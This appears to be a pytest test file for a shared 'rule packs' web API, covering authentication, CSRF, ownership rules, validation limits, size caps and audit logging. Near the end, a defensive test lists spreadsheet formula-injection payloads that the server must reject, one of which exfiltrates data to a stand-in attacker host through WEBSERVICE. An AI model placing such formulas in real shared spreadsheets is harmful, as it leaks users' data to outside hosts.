"""``/api/rule-packs`` (pilot WP-A, docs/v3/05).

Shared team library: any signed-in user lists, reads and creates; only the
owner or an admin replaces or deletes (403 for anyone else). PUT bumps the
version. Shape and size caps, the publish gate (a test per model), the
512 KiB body cap, CSRF, and the audit trail in ``events``.
"""

from __future__ import annotations

import copy
import json

import pytest

URL = "/api/rule-packs"

# The 05 §9 Kafka template, as the SPA sends it (camelCase, `from`).
KAFKA_MODEL = {
    "id": "kafka-template",
    "nameVi": "Kafka",
    "nameEn": "Kafka",
    "componentType": "kafka",
    "formulaMode": "units",
    "inputs": [
        {"name": "ingress", "labelVi": "Ingress", "labelEn": "Ingress", "unit": "MB/s", "default": 150, "min": 0},
        {"name": "rf", "labelVi": "RF", "labelEn": "RF", "unit": "count", "default": 3},
        {"name": "retention", "labelVi": "Retention", "labelEn": "Retention", "unit": "day", "default": 3},
    ],
    "params": [{"name": "broker_write", "value": 100, "unit": "MB/s", "source": "catalog"}],
    "calc": [
        {"name": "tp_brokers", "formula": "ceil(ingress * rf / broker_write / 0.6)", "unit": "broker", "excelFormula": "=ROUNDUP(B2*B3/B5/0.6,0)"},
        {"name": "brokers", "formula": "max(tp_brokers, rf)", "unit": "broker"},
    ],
    "outputs": [{"name": "brokers", "from": "brokers", "unit": "broker", "rounding": "ceil", "labelEn": "Brokers"}],
    "warnings": [{"condition": "rf < 3", "severity": "high", "messageVi": "RF < 3", "messageEn": "RF < 3"}],
    "lookups": [{"name": "raid", "columns": ["level", "factor"], "rows": [[10, 2], ["RAID6", 1.25]]}],
    "tests": [{"id": "T1", "inputs": {"ingress": 150}, "expected": {"brokers": 8}, "tolerance": 0.000001}],
}


def pack_body(**overrides) -> dict:
    body = {"name": "Team Kafka", "version": 1, "status": "draft", "description": "from the template", "models": [copy.deepcopy(KAFKA_MODEL)]}
    body.update(overrides)
    return body


def create(test_client, **overrides) -> dict:
    response = test_client.post(URL, json=pack_body(**overrides))
    assert response.status_code == 201, response.text
    return response.json()


@pytest.fixture()
def member_c(client, migrated_db, temp_settings):
    """A second member, so "member vs member" and "member vs admin" are both testable."""
    from fastapi.testclient import TestClient

    from app.repositories import users as users_repo

    users_repo.create_user(migrated_db, username="third", password="third-long-password", role="member", iterations=temp_settings.pbkdf2_iterations)
    test_client = TestClient(client.app)
    test_client.__enter__()
    response = test_client.post("/api/auth/login", json={"username": "third", "password": "third-long-password"})
    assert response.status_code == 200, response.text
    test_client.headers["x-csrf-token"] = response.json()["csrfToken"]
    yield test_client
    test_client.__exit__(None, None, None)


# --------------------------------------------------------------------------
# Authentication and CSRF
# --------------------------------------------------------------------------


def test_every_route_requires_authentication(client):
    assert client.get(URL).status_code == 401
    assert client.get(f"{URL}/rpk_x").status_code == 401
    assert client.post(URL, json=pack_body()).status_code == 401
    assert client.put(f"{URL}/rpk_x", json=pack_body()).status_code == 401
    assert client.delete(f"{URL}/rpk_x").status_code == 401


def test_cookie_authenticated_create_without_csrf_header_is_rejected(client, login):
    login()  # session cookie set; header deliberately not sent
    response = client.post(URL, json=pack_body())
    assert response.status_code == 403
    assert "csrf" in response.json()["detail"]


# --------------------------------------------------------------------------
# Happy path
# --------------------------------------------------------------------------


def test_create_returns_201_version_1_owner_and_the_models_unchanged(user_a):
    response = user_a.post(URL, json=pack_body(version=7, id="hijack", builtIn=True, owner="someone"))
    assert response.status_code == 201, response.text
    pack = response.json()
    assert response.headers["location"] == f"{URL}/{pack['id']}"
    assert pack["id"].startswith("rpk_")
    assert (pack["version"], pack["builtIn"], pack["owner"], pack["status"]) == (1, False, "architect", "draft")
    assert pack["description"] == "from the template"
    assert pack["createdAt"] == pack["updatedAt"]
    model = pack["models"][0]
    assert model["outputs"][0]["from"] == "brokers", "`from` survives the Python keyword"
    assert model["calc"][0]["excelFormula"] == "=ROUNDUP(B2*B3/B5/0.6,0)"
    assert model["lookups"][0]["rows"] == [[10, 2], ["RAID6", 1.25]]
    # Numbers come back as JSON numbers equal to what was sent (5000 == 5000.0 for JS).
    assert json.loads(json.dumps(model)) == json.loads(json.dumps(KAFKA_MODEL))


def test_every_signed_in_user_can_list_and_read_every_pack(user_a, user_b):
    pack = create(user_a)
    listed = user_b.get(URL)
    assert listed.status_code == 200
    assert listed.json()["total"] == 1
    assert [item["id"] for item in listed.json()["items"]] == [pack["id"]]
    assert user_b.get(f"{URL}/{pack['id']}").json() == pack


def test_list_is_newest_change_first_and_paginated(user_a, migrated_db):
    first = create(user_a, name="first")
    second = create(user_a, name="second")
    assert user_a.put(f"{URL}/{first['id']}", json=pack_body(name="first, edited")).status_code == 200
    # Timestamps have second precision; make "first was changed last" explicit.
    migrated_db.execute("UPDATE rule_packs SET updated_at = '2099-01-01T00:00:00+00:00' WHERE id = ?", (first["id"],))
    body = user_a.get(URL, params={"limit": 1}).json()
    assert body["total"] == 2
    assert [item["name"] for item in body["items"]] == ["first, edited"]
    assert [item["id"] for item in user_a.get(URL, params={"limit": 1, "offset": 1}).json()["items"]] == [second["id"]]
    assert user_a.get(URL, params={"limit": 0}).status_code == 422


def test_owner_put_replaces_and_increments_version_each_time(user_b):
    pack = create(user_b)
    path = f"{URL}/{pack['id']}"
    edited = pack_body(name="Renamed", status="published", version=1)
    first = user_b.put(path, json=edited)
    assert first.status_code == 200, first.text
    assert (first.json()["version"], first.json()["name"], first.json()["status"]) == (2, "Renamed", "published")
    assert first.json()["createdAt"] == pack["createdAt"]
    second = user_b.put(path, json=edited)
    assert second.json()["version"] == 3, "the client's version is ignored; the server always increments"
    assert user_b.get(path).json()["version"] == 3


def test_owner_can_delete(user_b):
    pack = create(user_b)
    assert user_b.delete(f"{URL}/{pack['id']}").status_code == 204
    assert user_b.get(f"{URL}/{pack['id']}").status_code == 404
    assert user_b.delete(f"{URL}/{pack['id']}").status_code == 404


# --------------------------------------------------------------------------
# Who may change a pack
# --------------------------------------------------------------------------


def test_another_member_cannot_replace_or_delete_and_nothing_changes(user_b, member_c):
    pack = create(user_b)
    path = f"{URL}/{pack['id']}"
    put = member_c.put(path, json=pack_body(name="taken over"))
    assert put.status_code == 403
    assert put.json()["detail"] == "only the owner of this rule pack or an admin can change it"
    assert member_c.delete(path).status_code == 403
    assert member_c.get(path).json() == pack


def test_an_admin_can_replace_and_delete_any_pack(user_a, user_b):
    pack = create(user_b)  # owned by the member
    path = f"{URL}/{pack['id']}"
    updated = user_a.put(path, json=pack_body(name="fixed by admin"))
    assert updated.status_code == 200
    assert (updated.json()["version"], updated.json()["owner"]) == (2, "intruder"), "ownership does not move to the admin"
    assert user_a.delete(path).status_code == 204
    assert user_b.get(path).status_code == 404


def test_a_member_cannot_touch_an_admins_pack(user_a, user_b):
    pack = create(user_a)
    assert user_b.put(f"{URL}/{pack['id']}", json=pack_body()).status_code == 403
    assert user_b.delete(f"{URL}/{pack['id']}").status_code == 403


def test_unknown_pack_is_404_everywhere(user_a):
    assert user_a.get(f"{URL}/rpk_missing").status_code == 404
    assert user_a.put(f"{URL}/rpk_missing", json=pack_body()).status_code == 404
    assert user_a.delete(f"{URL}/rpk_missing").status_code == 404


# --------------------------------------------------------------------------
# Validation and limits
# --------------------------------------------------------------------------


def _model(**overrides) -> dict:
    model = copy.deepcopy(KAFKA_MODEL)
    model.update(overrides)
    return model


@pytest.mark.parametrize(
    ("body", "fragment"),
    [
        (pack_body(models=[_model(id=f"m{i}") for i in range(51)]), "models"),
        (pack_body(models=[_model(calc=[{"name": f"c{i}", "formula": "1", "unit": ""} for i in range(201)])]), "calc"),
        (pack_body(status="approved"), "status"),
        (pack_body(name="   "), "name"),
        (pack_body(models=[_model(), _model()]), "model ids must be unique"),
        (pack_body(status="published", models=[_model(tests=[])]), "at least one test per model"),
        (pack_body(models=[_model(inputs=[{"name": "bad name", "labelVi": "", "labelEn": "", "unit": "", "default": 1}])]), "inputs"),
        (pack_body(models=[_model(warnings=[{"condition": "1", "severity": "critical", "messageVi": "", "messageEn": ""}])]), "severity"),
        ({"name": "no models"}, "models"),
    ],
)
def test_invalid_bodies_are_422_with_a_readable_detail(user_a, migrated_db, body, fragment):
    response = user_a.post(URL, json=body)
    assert response.status_code == 422, response.text
    assert fragment in response.json()["detail"]
    assert migrated_db.execute("SELECT COUNT(*) FROM rule_packs").fetchone()[0] == 0


@pytest.mark.parametrize("number", ["NaN", "Infinity", "-Infinity", "1e400"])
def test_non_finite_numbers_are_422_not_stored(user_a, migrated_db, number):
    body = json.dumps(pack_body()).replace('"default": 150', f'"default": {number}')
    response = user_a.post(URL, content=body.encode(), headers={"content-type": "application/json"})
    assert response.status_code == 422, response.text
    assert migrated_db.execute("SELECT COUNT(*) FROM rule_packs").fetchone()[0] == 0


def test_a_body_over_512_kib_is_413(user_a, migrated_db):
    body = pack_body(padding="x" * (512 * 1024))  # unknown key: ignored by the schema, but still bytes on the wire
    response = user_a.post(URL, json=body)
    assert response.status_code == 413
    assert "larger than 524288 bytes" in response.json()["detail"]
    pack = create(user_a)
    assert user_a.put(f"{URL}/{pack['id']}", json=body).status_code == 413
    assert migrated_db.execute("SELECT version FROM rule_packs").fetchone()[0] == 1


def test_a_body_just_under_the_cap_is_accepted(user_a):
    calc = [{"name": f"c{i}", "formula": "1 + " * 400 + "1", "unit": "", "description": "d" * 400} for i in range(200)]
    body = pack_body(models=[_model(calc=calc)])
    assert len(json.dumps(body)) < 512 * 1024
    assert user_a.post(URL, json=body).status_code == 201


# --------------------------------------------------------------------------
# Storage
# --------------------------------------------------------------------------


def test_create_update_delete_are_audited_in_events(user_a, migrated_db):
    pack = create(user_a)
    user_a.put(f"{URL}/{pack['id']}", json=pack_body(status="published"))
    user_a.delete(f"{URL}/{pack['id']}")
    rows = migrated_db.execute(
        "SELECT event_type, target_id, payload_json FROM events WHERE event_type LIKE 'rule_pack.%' ORDER BY id"
    ).fetchall()
    assert [(row["event_type"], row["target_id"]) for row in rows] == [
        ("rule_pack.created", pack["id"]),
        ("rule_pack.updated", pack["id"]),
        ("rule_pack.deleted", pack["id"]),
    ]
    assert json.loads(rows[1]["payload_json"]) == {"version": 2, "status": "published", "name": "Team Kafka"}


def test_the_table_refuses_a_bad_status_and_invalid_json(migrated_db, seeded_user):
    import sqlite3

    for status, body in (("approved", "{}"), ("draft", "{not json")):
        with pytest.raises(sqlite3.IntegrityError):
            migrated_db.execute(
                "INSERT INTO rule_packs (id, owner_user_id, name, version, status, body_json, created_at, updated_at)"
                " VALUES ('rpk_x', ?, 'n', 1, ?, ?, 't', 't')",
                (seeded_user["id"], status, body),
            )


@pytest.mark.parametrize(
    "excel_formula",
    [
        '=WEBSERVICE("http://attacker.invalid/?d="&ingress)',
        '=HYPERLINK("http://x.invalid","x")',
        "=_xlfn.WEBSERVICE(1)",
        "=ingress*Sheet1!A1",
        "='[evil.xlsx]Sheet1'!A1",
        '=INDIRECT("A1")',
    ],
)
def test_stored_excel_formulas_outside_the_allow_list_are_rejected(user_a, excel_formula):
    # Security review 2026-10-15 #1: packs are shared, so a hostile formula must not be stored.
    model = copy.deepcopy(KAFKA_MODEL)
    model["calc"][0]["excelFormula"] = excel_formula
    response = user_a.post(URL, json=pack_body(models=[model]))
    assert response.status_code == 422, response.text


def test_allow_listed_excel_formulas_are_accepted(user_a):
    model = copy.deepcopy(KAFKA_MODEL)
    model["calc"][0]["excelFormula"] = "=_xlfn.CEILING.MATH(ingress*rf/broker_write/0.6)+MAX(rf,1)"
    assert user_a.post(URL, json=pack_body(models=[model])).status_code == 201
